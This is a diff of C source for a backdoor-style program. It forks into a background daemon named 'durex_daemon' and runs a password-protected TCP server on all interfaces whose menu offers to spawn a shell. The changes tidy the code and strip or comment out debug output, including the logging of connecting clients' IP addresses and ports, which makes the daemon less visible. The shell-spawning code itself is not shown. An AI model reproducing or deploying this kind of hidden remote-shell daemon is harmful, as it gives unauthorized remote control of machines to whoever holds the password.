@@ -16,77 +16,48 @@ int daemonize(char* name, char* path, char* infile, char *outfile, char *errfile
 {
 	pid_t pid;
 
-	if (!path) 
-	{ 
-		path="/"; 
-	}
-    if (!name) 
-	{ 
-		name="durex_daemon"; 
-	}
-	if (!infile) 
-	{ 
-		infile="/dev/null"; 
-	}
-    if (!outfile) 
-	{ 
-		outfile="/dev/null"; 
-	}
-    if (!errfile) 
-	{ 
-		errfile="/dev/null"; 
-	}
-
+	if (!path) {path="/";}
+    if (!name) {name="durex_daemon";}
+	if (!infile) {infile="/dev/null";}
+    if (!outfile) {outfile="/dev/null";}
+    if (!errfile) {errfile="/dev/null";}
     // Fork off the parent process
     pid = fork();
-
     // An error occurred
     if (pid < 0)
         exit(EXIT_FAILURE);
-
     // Success: Let the parent terminate
     if (pid > 0)
         exit(EXIT_SUCCESS);
-
     // On success: The child process becomes session leader
     if (setsid() < 0)
         exit(EXIT_FAILURE);
-
     // Catch, ignore and handle signals
     //TODO: Implement a working signal handler
     signal(SIGCHLD, SIG_IGN);
     signal(SIGHUP, SIG_IGN);
-
 	// Fork off for the second time
     pid = fork();
-
     // An error occurred
     if (pid < 0)
         exit(EXIT_FAILURE);
-
     // Success: Let the parent terminate
     if (pid > 0)
         exit(EXIT_SUCCESS);
-
     // Set new file permissions
     umask(0);
-
     // Change the working directory to the root directory
     if (chdir("/"))
 		exit(EXIT_FAILURE);
-
 	//Close all open file descriptors
-    int fd;
-    for(fd=sysconf(_SC_OPEN_MAX); fd > 0; --fd)
+    for(int fd=sysconf(_SC_OPEN_MAX); fd > 0; --fd)
     {
         close(fd);
     }
-
     //reopen stdin, stdout, stderr
     stdin = fopen(infile,"r");   //fd=0
     stdout = fopen(outfile,"w+");  //fd=1
     stderr = fopen(errfile,"w+");  //fd=2
-
 	return 0;
 }
 
@@ -110,7 +81,11 @@ int r_shell(void)
 	char conn_refused_msg[] = "Connexion refused\n";
 	char welcome_msg[] = "Welcome !\nCommands:\n\tshell:\tspawn a shell\n\tstop:\tstop server\n>: ";
 	//char confirm_msg[] = "Are you sure ? (y - n): ";
-	
+
+	for (int i = 0; i < MAX_CLIENTS; ++i)
+	{
+		clients_sockets[i] = 0;
+	}
 	// set the server address
     server_address.sin_family = AF_INET;
     server_address.sin_addr.s_addr = INADDR_ANY;
@@ -143,8 +118,6 @@ int r_shell(void)
 		close(master_sd);
 		return -1;
 	}
-	
-	printf("So far so good\n");
 	while (1)
 	{
 		//clear the socket set 
@@ -170,7 +143,6 @@ int r_shell(void)
         {  
             printf("error select\n");  
         }
-
 		//If something happened on the master socket, then its an incoming connection 
         if (FD_ISSET(master_sd, &readfds))  
         {  
@@ -179,10 +151,8 @@ int r_shell(void)
                 printf("error accepting connexion\n");  
                 return -1;  
             }
-             
             //inform user of socket number - used in send and receive commands 
-            printf("New connection , socket fd is %d , ip is : %s , port : %d\n", new_socket, inet_ntoa(client_address.sin_addr), ntohs(client_address.sin_port));  
-           
+            //printf("New connection , socket fd is %d , ip is : %s , port : %d\n", new_socket, inet_ntoa(client_address.sin_addr), ntohs(client_address.sin_port));  
             send(new_socket, hello_msg, strlen(hello_msg), 0);
 			// check password
 			if (read(new_socket, buffer, 1024) < 0)
@@ -199,8 +169,7 @@ int r_shell(void)
 				return 1;
 			}
 			send(new_socket, welcome_msg, strlen(welcome_msg), 0); 
-            printf("Welcome message sent successfully\n");  
-                 
+            //printf("Welcome message sent successfully\n");    
             //add new socket to array of sockets 
             for (int i = 0; i < MAX_CLIENTS; i++)  
             {
@@ -208,7 +177,7 @@ int r_shell(void)
                 if(clients_sockets[i] == 0)  
                 {  
                     clients_sockets[i] = new_socket;  
-                    printf("Adding to list of sockets as %d\n", i);  
+                    //printf("Adding to list of sockets as %d\n", i);  
                     break;  
                 }
             }
@@ -217,7 +186,6 @@ int r_shell(void)
         for (int i = 0; i < MAX_CLIENTS; i++)  
         {
             sd = clients_sockets[i];  
-
             if (FD_ISSET(sd , &readfds))  
             {
                 //Check if it was for closing , and also read the incoming message 
@@ -231,7 +199,7 @@ int r_shell(void)
                     close(sd);
                     clients_sockets[i] = 0;
                 }
-                //Echo back the message that came in 
+                //Handle commands
                 else
                 {  
                     //set the string terminating NULL byte on the end of the data read 
@@ -263,16 +231,10 @@ int main(void)
 		printf("Failed to run daemon\n");
 		return EXIT_FAILURE;
 	}
-
-	printf("Daemon ON\n");
-
 	while (1)
 	{
 		if (r_shell())
-		{
-			printf("error\n");
 			break;
-		}
 		sleep(1);
 	}
 	return EXIT_SUCCESS;
